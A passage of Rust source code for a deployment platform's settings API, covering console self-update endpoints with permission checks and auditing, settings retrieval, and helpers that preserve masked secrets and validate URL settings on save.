        // Covers both "up to date" and "no check has succeeded yet" — the
        // banner is advisory, so the UI treats them identically.
        None => UpdateStatusResponse {
            update_available: false,
            current_version: None,
            latest_version: None,
            channel: None,
            release_url: None,
            checked_at: None,
            docs_url: temps_core::UPGRADE_DOCS_URL.to_string(),
        },
    };

    Ok(Json(response))
}

// ── Applying a release from the console ──────────────────────────────────────

/// Whether this install can apply a release update on request, and how the last
/// attempt went.
///
/// Deliberately answerable even when the answer is "no": an operator who cannot
/// use the button still needs to know *why* and what to run instead, so this
/// never 404s or returns an empty body when the feature is unavailable.
#[derive(Debug, Serialize, ToSchema)]
pub struct UpdateCapabilityResponse {
    /// True only when a request would actually download, install and restart.
    pub can_apply: bool,
    /// Whether the *caller* holds `platform:update`. Distinct from `can_apply`,
    /// which describes the server: the console shows the action only when both
    /// are true, so a reader is never offered a button that would 403.
    pub allowed: bool,
    /// Machine-readable reason `can_apply` is false (`disabled_by_flag`,
    /// `disabled_by_setting`, `container`, `no_supervisor`, `binary_not_writable`,
    /// `unsupported_platform`, `in_progress`).
    pub blocker: Option<temps_core::SelfUpdateBlocker>,
    /// Operator-facing explanation of `blocker`.
    pub reason: Option<String>,
    /// Non-blocking warning to show with the confirmation (split topology).
    pub caveat: Option<String>,
    /// The equivalent command to run by hand. Always present.
    pub manual_command: String,
    /// Version tag of the running binary. Always present — the version page
    /// needs it whether or not an update exists.
    pub current_version: String,
    /// Channel actually tracked, after applying the configured override or
    /// falling back to inference from the running version tag.
    pub channel: String,
    /// True when `channel` was set explicitly in settings rather than inferred.
    pub channel_is_pinned: bool,
    /// What would restart the process: `systemd`, `launchd`, `container`, `none`.
    pub supervisor: temps_core::SupervisorKind,
    /// `automatic` when applying an update also restarts temps; `manual` when
    /// it only installs the binary and the operator restarts on their own
    /// schedule. Lets the console set expectations before the click.
    pub restart_mode: temps_core::SelfUpdateRestartMode,
    /// Binary that would be replaced.
    pub binary_path: String,
    /// Phase of an in-flight attempt: `idle` when none is running.
    pub phase: temps_core::SelfUpdatePhase,
    /// Failure detail while `phase` is `failed`.
    pub phase_error: Option<String>,
    /// Most recent attempt, including one resolved during this boot — this is
    /// how the console reports the outcome of an update that restarted it.
    pub last_attempt: Option<temps_core::SelfUpdateAttempt>,
    /// Number of migrations applied so far. `Some` while `phase` is `migrating`.
    pub migrations_applied: Option<u32>,
    /// Total migrations to be applied. `Some` once the migrate child has
    /// reported its first `started` event.
    pub migrations_total: Option<u32>,
    /// Name of the migration currently running. `Some` while `phase` is
    /// `migrating` and a migration step is in flight.
    pub current_migration_name: Option<String>,
}

/// Optional pin for the version to install.
#[derive(Debug, Default, Deserialize, ToSchema)]
pub struct StartUpdateRequest {
    /// Release tag to install (e.g. `v0.2.0`). Omit to take the newest release
    /// on the channel this install already tracks.
    pub version: Option<String>,
}

/// Acknowledgement that an update was accepted and is running.
#[derive(Debug, Serialize, ToSchema)]
pub struct StartUpdateResponse {
    /// Version the server is running as it accepts this request.
    pub current_version: String,
    /// How long to allow for the server to come back before treating the
    /// restart as failed. `0` when nothing restarts.
    pub estimated_restart_secs: u64,
    /// `automatic` (temps restarts itself) or `manual` (installed only).
    pub restart_mode: temps_core::SelfUpdateRestartMode,
    pub message: String,
}

/// Read the database-backed half of the update policy.
///
/// Fails CLOSED: if settings cannot be read we must not report (or act on) a
/// capability the operator may have deliberately turned off.
async fn load_self_update_policy(app_state: &SettingsState) -> temps_core::SelfUpdatePolicy {
    match app_state.config_service.get_settings().await {
        Ok(settings) => {
            let self_update = settings.self_update();
            temps_core::SelfUpdatePolicy {
                enabled: self_update.enabled,
                channel: self_update.channel,
            }
        }
        Err(e) => {
            error!("Could not read self-update settings, treating as disabled: {e}");
            temps_core::SelfUpdatePolicy {
                enabled: false,
                channel: None,
            }
        }
    }
}

/// Build the "no updater registered in this process" answer.
///
/// Reached in hosts that run the settings API without owning the process
/// lifecycle. Reported as a capability with a reason rather than an error, so
/// the console renders the same explain-and-point-at-the-CLI surface it uses
/// for every other blocked state.
fn updater_unavailable_response(allowed: bool) -> UpdateCapabilityResponse {
    UpdateCapabilityResponse {
        can_apply: false,
        allowed,
        blocker: Some(temps_core::SelfUpdateBlocker::NotSupported),
        reason: Some(
            "This process does not manage the temps binary, so it cannot apply an update. \
             Upgrade from the command line on the host instead."
                .to_string(),
        ),
        caveat: None,
        manual_command: "temps upgrade".to_string(),
        current_version: String::new(),
        channel: "unknown".to_string(),
        channel_is_pinned: false,
        supervisor: temps_core::SupervisorKind::None,
        restart_mode: temps_core::SelfUpdateRestartMode::Manual,
        binary_path: String::new(),
        phase: temps_core::SelfUpdatePhase::Idle,
        phase_error: None,
        last_attempt: None,
        migrations_applied: None,
        migrations_total: None,
        current_migration_name: None,
    }
}

/// Ask the release API for the newest version on this install's channel, now,
/// instead of waiting for the background notifier's next pass.
#[utoipa::path(
    tag = "Settings",
    post,
    path = "/settings/update/check",
    responses(
        (status = 200, description = "Result of the release check", body = temps_core::ReleaseCheckResult),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 502, description = "The release API could not be reached", body = temps_core::ProblemDetails),
        (status = 501, description = "This process cannot check for updates", body = temps_core::ProblemDetails)
    ),
    security(("bearer_auth" = []))
)]
async fn check_for_update(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    // A read-only network probe that changes no state the operator can't
    // already see, so it sits with the rest of the settings reads.
    permission_guard!(auth, SettingsRead);

    let Some(updater) = app_state.self_updater.as_ref() else {
        return Err(ErrorBuilder::new(StatusCode::NOT_IMPLEMENTED)
            .title("Update Checks Not Supported Here")
            .detail("This process does not track temps releases.")
            .build());
    };

    let policy = load_self_update_policy(&app_state).await;
    let result = updater.check_now(policy.channel).await.map_err(|reason| {
        // Upstream reachability, not a client mistake — say so plainly so the
        // operator looks at egress rather than at their own request.
        ErrorBuilder::new(StatusCode::BAD_GATEWAY)
            .title("Release Check Failed")
            .detail(reason)
            .build()
    })?;

    Ok(Json(result))
}

/// Report whether a release update can be applied from the console.
#[utoipa::path(
    tag = "Settings",
    get,
    path = "/settings/update",
    responses(
        (status = 200, description = "Self-update capability for this install", body = UpdateCapabilityResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions")
    ),
    security(("bearer_auth" = []))
)]
async fn get_update_capability(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    // Readable by anyone who can read settings: the banner needs this to decide
    // what to render. Actually *starting* an update needs `platform:update`,
    // reported separately as `allowed`.
    permission_guard!(auth, SettingsRead);

    let allowed = auth.has_permission(&temps_auth::Permission::PlatformUpdate);

    let Some(updater) = app_state.self_updater.as_ref() else {
        return Ok(Json(updater_unavailable_response(allowed)));
    };

    let capability = updater.capability(&load_self_update_policy(&app_state).await);
    Ok(Json(UpdateCapabilityResponse {
        // Describes the SERVER only. Permission is reported separately as
        // `allowed` so a blocked install and an under-privileged caller stay
        // distinguishable — collapsing them would leave the UI unable to say
        // which of the two it is looking at.
        can_apply: capability.can_apply,
        allowed,
        blocker: capability.blocker,
        reason: capability.reason,
        caveat: capability.caveat,
        manual_command: capability.manual_command,
        current_version: capability.current_version,
        channel: capability.channel,
        channel_is_pinned: capability.channel_is_pinned,
        supervisor: capability.supervisor,
        restart_mode: capability.restart_mode,
        // Host filesystem layout is only useful to someone who can actually
        // run an update; readers with `settings:read` alone get nothing from
        // it but a hint about where the install lives.
        binary_path: if allowed {
            capability.binary_path
        } else {
            String::new()
        },
        phase: capability.phase,
        phase_error: capability.phase_error,
        last_attempt: capability.last_attempt,
        migrations_applied: capability.migrations_applied,
        migrations_total: capability.migrations_total,
        current_migration_name: capability.current_migration_name,
    }))
}

/// Install a release and restart the server.
///
/// Returns as soon as the attempt is accepted: the download and swap run in the
/// background and the process then exits so its supervisor restarts it on the
/// new binary. Poll `GET /settings/update` for progress — after the restart,
/// `last_attempt` carries the outcome.
#[utoipa::path(
    tag = "Settings",
    post,
    path = "/settings/update",
    request_body = StartUpdateRequest,
    responses(
        (status = 202, description = "Update accepted; the server will restart", body = StartUpdateResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 409, description = "Update unavailable or already running", body = temps_core::ProblemDetails),
        (status = 501, description = "This process cannot apply updates", body = temps_core::ProblemDetails)
    ),
    security(("bearer_auth" = []))
)]
async fn start_update(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
    Extension(metadata): Extension<RequestMetadata>,
    Json(request): Json<StartUpdateRequest>,
) -> Result<impl IntoResponse, Problem> {
    // NOT SettingsWrite: replacing the running binary and dropping every
    // in-flight request is a different class of action from editing a config
    // value, so it carries its own permission.
    permission_guard!(auth, PlatformUpdate);

    let Some(updater) = app_state.self_updater.as_ref() else {
        return Err(ErrorBuilder::new(StatusCode::NOT_IMPLEMENTED)
            .title("Self-Update Not Supported Here")
            .detail(
                "This process does not manage the temps binary. Upgrade from the command line \
                 on the host with `temps upgrade`.",
            )
            .build());
    };

    let started = updater
        .start(
            request.version.clone(),
            Some(auth.user_id()),
            &load_self_update_policy(&app_state).await,
        )
        .map_err(self_update_error_to_problem)?;

    // Audited BEFORE the restart — the process is about to exit, and an update
    // that leaves no trace of who triggered it is exactly the record an
    // operator needs afterwards.
    let audit = PlatformUpdateStartedAudit {
        context: AuditContext {
            user_id: auth.user_id(),
            ip_address: Some(metadata.ip_address.clone()),
            user_agent: metadata.user_agent.clone(),
        },
        from_version: started.current_version.clone(),
        target_version: request.version.clone(),
    };
    if let Err(e) = app_state.audit_service.create_audit_log(&audit).await {
        error!("Failed to create audit log for platform update: {}", e);
    }

    info!(
        user_id = auth.user_id(),
        from = %started.current_version,
        target = ?request.version,
        "Platform update started from the console"
    );

    Ok((
        StatusCode::ACCEPTED,
        Json(StartUpdateResponse {
            current_version: started.current_version,
            estimated_restart_secs: started.estimated_restart_secs,
            restart_mode: started.restart_mode,
            message: match started.restart_mode {
                temps_core::SelfUpdateRestartMode::Automatic => {
                    "Update started. The server will restart when the new binary is installed."
                }
                temps_core::SelfUpdateRestartMode::Manual => {
                    "Update started. The new binary will be installed, but temps keeps running \
                     the current version until you restart it."
                }
            }
            .to_string(),
        }),
    ))
}

fn self_update_error_to_problem(error: temps_core::SelfUpdateError) -> Problem {
    use temps_core::{SelfUpdateBlocker, SelfUpdateError};
    let status = match error {
        // These describe current state the caller can change (a flag, a
        // setting, a running attempt) rather than a malformed request.
        SelfUpdateError::Unavailable { .. } | SelfUpdateError::AlreadyRunning { .. } => {
            StatusCode::CONFLICT
        }
        // A bad argument, not a state of the install.
        SelfUpdateError::InvalidVersion { .. } => StatusCode::BAD_REQUEST,
    };
    let Some(blocker) = error.blocker() else {
        return ErrorBuilder::new(status)
            .title("Invalid Version")
            .detail(error.to_string())
            .build();
    };
    let title = match blocker {
        SelfUpdateBlocker::DisabledByFlag | SelfUpdateBlocker::DisabledBySetting => {
            "Self-Update Disabled"
        }
        SelfUpdateBlocker::InProgress => "Update Already Running",
        SelfUpdateBlocker::NotSupported => "Self-Update Not Supported Here",
        SelfUpdateBlocker::BinaryNotWritable => "Binary Not Writable",
        SelfUpdateBlocker::UnsupportedPlatform => "Unsupported Platform",
    };
    ErrorBuilder::new(status)
        .title(title)
        .detail(error.to_string())
        .value(
            "blocker",
            serde_json::to_value(blocker)
                .unwrap_or(serde_json::Value::Null)
                .as_str()
                .unwrap_or_default()
                .to_string(),
        )
        .build()
}

/// Get application settings
#[utoipa::path(
    tag = "Settings",
    get,
    path = "/settings",
    responses(
        (status = 200, description = "Application settings with masked sensitive fields", body = AppSettingsResponse),
        (status = 401, description = "Unauthorized"),
        (status = 500, description = "Internal server error")
    ),
    security(
        ("bearer_auth" = [])
    )
)]
async fn get_settings(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsRead);

    let (settings_result, policies_result, monitored_services_result, cluster_network_result) = tokio::join!(
        app_state.config_service.get_settings(),
        app_state.config_service.get_effective_telemetry_policies(),
        app_state.config_service.count_monitored_services(),
        app_state.config_service.get_cluster_network_state(),
    );

    match settings_result {
        Ok(settings) => {
            // Convert to response type that masks sensitive fields, then
            // reconcile the effective metrics store with the server's
            // ClickHouse env-var configuration so the UI shows the backend the
            // runtime actually uses (not just the DB toggle).
            let policies = policies_result.unwrap_or_else(|error| {
                tracing::warn!(
                    %error,
                    "Failed to read effective TimescaleDB policies; using configured values"
                );
                EffectiveTelemetryPolicies::default()
            });
            let monitored_services_count = monitored_services_result
                .inspect_err(|error| {
                    tracing::warn!(
                        %error,
                        "Failed to count monitored services; storage estimate is unavailable"
                    );
                })
                .ok();
            let cluster_network_state = cluster_network_result
                .inspect_err(|error| {
                    tracing::warn!(
                        %error,
                        "Failed to read cluster network state; CIDR controls are unavailable"
                    );
                })
                .ok();
            let response = AppSettingsResponse::from(settings)
                .with_effective_store(app_state.config_service.is_clickhouse_enabled())
                .with_clickhouse_runtime_state(
                    app_state.config_service.is_clickhouse_enabled(),
                    app_state.config_service.clickhouse_compression(),
                    app_state.clickhouse_health.as_ref().map(|h| h.snapshot()),
                )
                .with_effective_timescale_state(policies, monitored_services_count)
                .with_cluster_network_state(cluster_network_state)
                .with_proxy_port(app_state.config_service.proxy_port());
            Ok(Json(response))
        }
        Err(e) => {
            tracing::error!("Failed to get settings: {}", e);
            Err(ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .type_("https://temps.sh/probs/settings-error")
                .title("Settings Error")
                .detail(format!("Failed to get settings: {}", e))
                .build())
        }
    }
}

/// Get current disk usage for the control-plane server
///
/// Returns live disk usage for the monitored path along with any disks that
/// meet or exceed the configured alert threshold. Read-only — does not send
/// notifications. Used by the dashboard to surface a low-disk-space warning.
#[utoipa::path(
    tag = "Settings",
    get,
    path = "/settings/disk-status",
    responses(
        (status = 200, description = "Current disk usage and threshold alerts", body = DiskSpaceCheckResult),
        (status = 401, description = "Unauthorized"),
        (status = 500, description = "Internal server error")
    ),
    security(
        ("bearer_auth" = [])
    )
)]
async fn get_disk_status(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsRead);

    let status = crate::disk_status::collect_disk_status(&app_state.config_service)
        .await
        .map_err(|e| {
            tracing::error!("Failed to collect disk status: {}", e);
            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .type_("https://temps.sh/probs/disk-status-error")
                .title("Disk Status Error")
                .detail(e.to_string())
                .build()
        })?;

    Ok(Json(status))
}

/// Restore settings fields that are recorded by the system itself and must not
/// be writable through the public `PUT /settings` API, copying them from the
/// current DB state onto the incoming payload.
///
/// Currently just `console_version` (ADR-017 Phase 3): a starting console
/// process records its binary version so a sibling `temps proxy` can warn on
/// version skew. The GET response never carries it, so without this an operator
/// round-trip would either spoof it or silently wipe it (`#[serde(default)]` →
/// `None`). Kept as a small pure helper so the invariant is unit-testable.
fn preserve_self_recorded_fields(incoming: &mut AppSettings, current: &AppSettings) {
    incoming.console_version = current.console_version.clone();
}

/// Keep security-relevant settings the client did not mention.
///
/// The settings PUT replaces the whole document and `AppSettings` deserializes
/// with `#[serde(default)]`, so a field a client omits is indistinguishable
/// from one it reset. That is harmless for presentation settings and dangerous
/// for `self_update`: an operator who deliberately forbade console updates
/// would have that silently undone by any unrelated save from a client built
/// before the field existed — including a published CLI, or a stale browser
/// tab. Absence therefore means "leave it alone", and only an explicit value
/// changes it.
fn preserve_omitted_security_fields(incoming: &mut AppSettings, current: &AppSettings) {
    if incoming.self_update.is_none() {
        incoming.self_update = current.self_update.clone();
    }
    if incoming.trust_loopback_forwarded_ip.is_none() {
        incoming.trust_loopback_forwarded_ip = current.trust_loopback_forwarded_ip;
    }
}

/// Restore every value the GET response masks or elides, so a client that
/// round-trips `GET /settings` into `PUT /settings` never overwrites a stored
/// secret with its mask (`"******"`), an empty string, or nothing.
///
/// Omitted keys are already refilled from the stored document by
/// [`fill_omitted_settings`]; this covers what that merge cannot: masks the
/// client echoes back as values, and fields the PUT must never change at all
/// (the cluster CA is only rotated through its dedicated endpoint).
fn preserve_masked_secrets(
    incoming: &mut AppSettings,
    current: &AppSettings,
    node_failover_sent: bool,
) {
    let is_mask_or_blank =
        |value: Option<&str>| value.is_none_or(|v| v.is_empty() || v == "******");

    if incoming.dns_provider.cloudflare_api_key.as_deref() == Some("******") {
        incoming.dns_provider.cloudflare_api_key = current.dns_provider.cloudflare_api_key.clone();
    }
    if incoming.docker_registry.password.as_deref() == Some("******") {
        incoming.docker_registry.password = current.docker_registry.password.clone();
    }
    // Legacy flat agent-sandbox credential.
    if is_mask_or_blank(incoming.agent_sandbox.api_key_encrypted.as_deref()) {
        incoming.agent_sandbox.api_key_encrypted = current.agent_sandbox.api_key_encrypted.clone();
    }
    // Sandbox placement nodes (ADR-048) are owned by
    // `PUT /sandboxes/placement`; `ConfigService` restores them from the
    // locked settings row on every generic save.
    if incoming.preview_gateway.shared_secret.is_empty() {
        incoming.preview_gateway.shared_secret = current.preview_gateway.shared_secret.clone();
    }
    incoming.multi_node.cluster_ca_cert_pem = current.multi_node.cluster_ca_cert_pem.clone();
    incoming.multi_node.cluster_ca_key_encrypted =
        current.multi_node.cluster_ca_key_encrypted.clone();
    // Owned by `temps serve --wg-endpoint`, not by the settings API.
    incoming.multi_node.wg_endpoint = current.multi_node.wg_endpoint.clone();
    if incoming.multi_node.join_token_hash.is_none() {
        incoming.multi_node.join_token_hash = current.multi_node.join_token_hash.clone();
    }
    // Keep the stored grace period (including a stored `null` = disabled)
    // unless the client actually sent the key. See `SettingsWritePresence`.
    if !node_failover_sent {
        incoming.multi_node.node_failover_after_secs = current.multi_node.node_failover_after_secs;
    }
    // The GET response reports the ClickHouse DSN only as `clickhouse_url_set`
    // because it can embed credentials.
    if incoming
        .monitoring
        .clickhouse_url
        .as_deref()
        .is_none_or(|url| url.trim().is_empty())
    {
        incoming.monitoring.clickhouse_url = current.monitoring.clickhouse_url.clone();
    }
}

fn discard_plugin_reporting_consent(body: &mut serde_json::Value) {
    if let Some(object) = body.as_object_mut() {
        object.remove("plugin_installation_reporting_enabled");
    }
}

/// Which of the operator-tuned `cloud.*` keys a `PUT /settings` body actually
/// carried.
///
/// `AppSettings` deserializes with `#[serde(default)]` at every level, so a body
/// that never mentions `cloud` produces a `CloudSettings::default()` that is —
/// once deserialization is done — indistinguishable from one where the client
/// spelled every default out. That is the whole bug this type exists to fix: the
/// console's own save has never sent a `cloud` block, so any unrelated settings
/// save silently reset the ADR-041 outbox ceiling and both ADR-042 spend guards
/// to their build-time defaults. Worse than the reset, an operator who had
/// *narrowed* the anomaly factor also had their next unrelated save refused with
/// a 403, because the guard authorization compares the incoming factor against
/// the stored one and an absent field reads as "widen it back to 5x".
///
/// Absence is therefore read off the wire, once, *before* the body becomes an
/// `AppSettings`. The obvious cheaper alternative — "if the value equals the
/// default, treat it as absent" — cannot work here: three of these four fields
/// have a non-sentinel default, so that rule makes the default unwritable. An
/// operator who narrowed the factor to 2x could never put it back to 5x, and one
/// who pointed `backend_url` at a staging Cloud could never point it home again.
///
/// An explicit `null` counts as **sent**: a client writing
/// `"telemetry_bulk_rate_limit_spans_per_sec": null` is asking to clear the
/// throttle, and honouring that is precisely why presence is tracked rather than
/// inferred from the value.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
struct CloudFieldsSent {
    backend_url: bool,
    telemetry_outbox_max_bytes: bool,
    telemetry_bulk_rate_limit_spans_per_sec: bool,
    telemetry_bulk_anomaly_factor: bool,
}

impl CloudFieldsSent {
    /// Read key presence from a raw settings document. A `cloud` member that is
    /// missing, or present but not an object, means the client sent none of
    /// these fields — a non-object is rejected moments later by deserialization
    /// anyway, so "sent nothing" is both true and the safe answer.
    fn from_settings_body(body: &serde_json::Value) -> Self {
        let Some(cloud) = body.get("cloud").and_then(serde_json::Value::as_object) else {
            return Self::default();
        };
        Self {
            backend_url: cloud.contains_key("backend_url"),
            telemetry_outbox_max_bytes: cloud.contains_key("telemetry_outbox_max_bytes"),
            telemetry_bulk_rate_limit_spans_per_sec: cloud
                .contains_key("telemetry_bulk_rate_limit_spans_per_sec"),
            telemetry_bulk_anomaly_factor: cloud.contains_key("telemetry_bulk_anomaly_factor"),
        }
    }
}

/// The presence-sensitive part of a `PUT /settings` body, as a typed view.
///
/// `PUT /settings` replaces the whole document and `#[serde(default)]` turns an
/// absent `multi_node.node_failover_after_secs` into `Some(300)`, so
/// `AppSettings` alone cannot tell "the client did not mention it" from "the
/// client wants the default". Without that distinction an older client saving
/// unrelated settings would silently reset a custom grace period — and turn an
/// explicit `null` (automatic failover disabled) back on.
///
/// The outer `Option` is presence, the inner one is the value: absent key ->
/// `None`, explicit `null` -> `Some(None)`, a number -> `Some(Some(n))`. A plain
/// `Option<Option<T>>` cannot express that — serde collapses `null` into the
/// outer `None` — hence [`deserialize_present`].
#[derive(Debug, Default, Deserialize)]
struct SettingsWritePresence {
    #[serde(default)]
    multi_node: Option<MultiNodeWritePresence>,
}

#[derive(Debug, Default, Deserialize)]
struct MultiNodeWritePresence {
    #[serde(default, deserialize_with = "deserialize_present")]
    node_failover_after_secs: Option<Option<u64>>,
}

/// Deserialize a field that was present on the wire, keeping `null` as
/// `Some(None)`. Only runs when the key exists; `#[serde(default)]` supplies
/// the outer `None` when it does not.
fn deserialize_present<'de, D, T>(deserializer: D) -> Result<Option<Option<T>>, D::Error>
where
    D: serde::Deserializer<'de>,
    T: Deserialize<'de>,
{
    Option::<T>::deserialize(deserializer).map(Some)
}

impl SettingsWritePresence {
    /// Read presence from a settings body. A body this view cannot read (a
    /// non-object `multi_node`, a non-numeric grace period) reports nothing as
    /// sent: the full `AppSettings` deserialization rejects that same body
    /// moments later, so "sent nothing" is both true and the safe answer.
    fn from_settings_body(body: &serde_json::Value) -> Self {
        Self::deserialize(body).unwrap_or_default()
    }

    /// Whether the client sent `multi_node.node_failover_after_secs` at all.
    /// An explicit `null` counts as sent.
    fn node_failover_after_secs_sent(&self) -> bool {
        self.multi_node
            .as_ref()
            .is_some_and(|multi_node| multi_node.node_failover_after_secs.is_some())
    }
}

/// Keep the parts of the `cloud` block a generic settings write must not change:
/// the export consent flags always, and every operator-tuned field the client
/// did not send.
///
/// Two rules, both consequences of `PUT /settings` replacing the whole document:
///
/// - **Consent is never writable through this endpoint.** Enabling a Cloud
///   export requires resource-specific permissions and goes through
///   `PATCH /cloud/features`; a generic settings write must not bypass those
///   guards even when it submits a complete `AppSettings`. Restored from the DB
///   unconditionally, whether the client sent it or not.
/// - **A field the client did not send keeps its stored value.** Applies to
///   `backend_url` and `telemetry_outbox_max_bytes` (ADR-041) and to both
///   bulk-activation guards (ADR-042 §3, §6.3). See [`CloudFieldsSent`] for why
///   "did not send" is read from the request body rather than inferred from the
///   deserialized value.
fn preserve_cloud_settings_not_sent_by_every_client(
    incoming: &mut AppSettings,
    current: &AppSettings,
    sent: CloudFieldsSent,
) {
    incoming.cloud.telemetry_enabled = current.cloud.telemetry_enabled;
    incoming.cloud.backups_enabled = current.cloud.backups_enabled;
    incoming.cloud.notifications_enabled = current.cloud.notifications_enabled;
    // ADR-045 §5: same reasoning as the three consent flags above -- enabling
    // console access requires `PATCH /cloud/features` (and, on the
    // unattended bootstrap path, is set exactly once and audited there), so
    // a generic settings write must never be able to flip it either way.
    incoming.cloud.console_access_enabled = current.cloud.console_access_enabled;
    // ADR-045 Amendment 2: the once-only bootstrap marker is written only by
    // `grant_bootstrap_telemetry_consent`. A stale full snapshot writing it
    // back to `false` would let the next upgrade re-grant telemetry export
    // the operator has since turned off.
    incoming.cloud.telemetry_consent_bootstrapped = current.cloud.telemetry_consent_bootstrapped;

    if !sent.backend_url {
        incoming.cloud.backend_url = current.cloud.backend_url.clone();
    }
    if !sent.telemetry_outbox_max_bytes {
        incoming.cloud.telemetry_outbox_max_bytes = current.cloud.telemetry_outbox_max_bytes;
    }
    if !sent.telemetry_bulk_rate_limit_spans_per_sec {
        incoming.cloud.telemetry_bulk_rate_limit_spans_per_sec =
            current.cloud.telemetry_bulk_rate_limit_spans_per_sec;
    }
    if !sent.telemetry_bulk_anomaly_factor {
        incoming.cloud.telemetry_bulk_anomaly_factor = current.cloud.telemetry_bulk_anomaly_factor;
    }
}

/// Trim and validate an optional URL setting (`external_url`/`internal_url`).
/// A blank value (after trimming) means "unset" and is normalized to `None`
/// rather than rejected -- `external_url` previously validated the raw
/// `Some("")` a client sends for a cleared field and rejected it with
/// "must start with http:// or https://", which made every settings save
/// fail with a 400 on any instance that had never configured it. Kept as a
/// small pure helper (shared by both URL fields) so the two can't drift
/// apart again and the invariant is unit-testable.
/// Validate a submitted `public_ingress_url` (ADR-051 D1).
///
/// Blank clears the setting. A value identical to the stored one is passed
/// through, so an unrelated save never fails over a field the client did not
/// change (the rules may have tightened since it was stored); it is only
/// checked against the preview domain, which the same save may be changing.
/// A new value must be a bare, internet-reachable origin outside the preview
/// domain's generated namespace, whose hostname no application uses: the
/// route table reserves it for the platform, and reserving a hostname that is
/// serving an application would take that application down without anyone
/// having asked for it.
///
/// "In use" is decided in two places, and both must agree the name is free:
///
/// - the stored domain records, exact or wildcard, which also cover a domain
///   attached to an environment that was never deployed;
/// - the route table, freshly loaded, which is the only place that knows the
///   names generated from an environment's subdomain, wildcard matches as
///   the proxy resolves them, stopped deployments and sleeping environments.
///
/// Without a route table there is no way to rule those out, so the change is
/// refused rather than accepted unchecked.
async fn validate_public_ingress_url(
    config_service: &ConfigService,
    route_table: Option<&dyn temps_core::route_table::RouteTableRefresher>,
    submitted: Option<String>,
    stored: Option<&str>,
    preview_domain: &str,
) -> Result<Option<String>, Problem> {
    let Some(raw) = submitted
        .map(|url| url.trim().to_string())
        .filter(|url| !url.is_empty())
    else {
        return Ok(None);
    };
    if stored.map(str::trim) == Some(raw.as_str()) {
        // Unchanged, so not re-validated — with one exception. The preview
        // domain may be what changed in this save, and moving it onto the
        // stored ingress hostname creates the same collision as moving the
        // ingress hostname into it: generated names and workspace previews
        // would share a namespace with the callback host.
        let stored_host = url::Url::parse(&raw)
            .ok()
            .and_then(|url| url.host_str().map(str::to_string))
            .unwrap_or_default();
        if let Some(conflict) =
            temps_core::public_ingress::preview_namespace_conflict(&stored_host, preview_domain)
        {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Preview Domain Conflicts With Public Ingress URL")
                .detail(format!(
                    "{conflict}. Change the public ingress URL first, or choose a preview \
                     domain that does not contain it."
                ))
                .value("field", "preview_domain")
                .build());
        }
        return Ok(Some(raw));
    }

    let normalized = temps_core::public_ingress::normalize_public_ingress_url(&raw, preview_domain)
        .map_err(|e| {
            ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Invalid Public Ingress URL")
                .detail(e.to_string())
                .value("field", "public_ingress_url")
                .build()
        })?;

    let host = url::Url::parse(&normalized)
        .ok()
        .and_then(|url| url.host_str().map(str::to_string))
        .unwrap_or_default();

    let in_use = |owner: &str| {
        ErrorBuilder::new(StatusCode::CONFLICT)
            .title("Public Ingress Hostname In Use")
            .detail(format!(
                "'{host}' is already used by {owner}. The public ingress hostname is \
                 reserved for Temps itself, so setting it would take that application \
                 offline. Choose a hostname no application uses, or remove the route first."
            ))
            .value("field", "public_ingress_url")
            .build()
    };
    let unverifiable = |why: String| {
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .title("Settings Save Aborted")
            .detail(format!(
                "Could not check whether '{host}' is already used by an application, so the \
                 public ingress URL was not saved: {why}"
            ))
            .build()
    };

    match config_service.hostname_claimed_by(&host).await {
        Ok(None) => {}
        Ok(Some(owner)) => return Err(in_use(owner)),
        Err(e) => {
            error!(
                "Could not check stored domains for public ingress hostname '{}': {}",
                host, e
            );
            return Err(unverifiable(e.to_string()));
        }
    }

    let Some(route_table) = route_table else {
        error!(
            "No route table is available to check public ingress hostname '{}'; refusing the change",
            host
        );
        return Err(unverifiable(
            "the route table is not available in this process".to_string(),
        ));
    };
    match route_table.application_serving_host(&host).await {
        Ok(None) => Ok(Some(normalized)),
        Ok(Some(owner)) => Err(in_use(&owner)),
        Err(e) => {
            error!(
                "Could not check the route table for public ingress hostname '{}': {}",
                host, e
            );
            Err(unverifiable(e.to_string()))
        }
    }
}

fn sanitize_optional_url(
    field_label: &str,
    url: Option<String>,
) -> Result<Option<String>, Problem> {
    let Some(raw) = url else {
        return Ok(None);
    };

    let trimmed = raw.trim().trim_end_matches('/').to_string();
    if trimmed.is_empty() {
        return Ok(None);
    }

    if !trimmed.starts_with("http://") && !trimmed.starts_with("https://") {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail(format!(
                "{field_label} URL must start with http:// or https://"
            ))
            .build());
    }
    if trimmed.contains('#') || trimmed.contains('?') {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail(format!(
                "{field_label} URL must not contain '#' or '?' characters"
            ))
            .build());
    }
    if url::Url::parse(&trimmed).is_err() {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .detail(format!("{field_label} URL is not a valid URL"))
            .build());
    }

    Ok(Some(trimmed))
}

/// Trim and validate `registry_mirror_prefix`, rejecting anything outside a
/// registry host+path's character set (alphanumerics, `.`, `-`, `_`, `:`,
/// `/`).
///
/// This is the write-time half of the injection defense: `qualify_with_registry_prefix`
/// (`temps-core::registry_prefix`) already refuses to splice a malformed
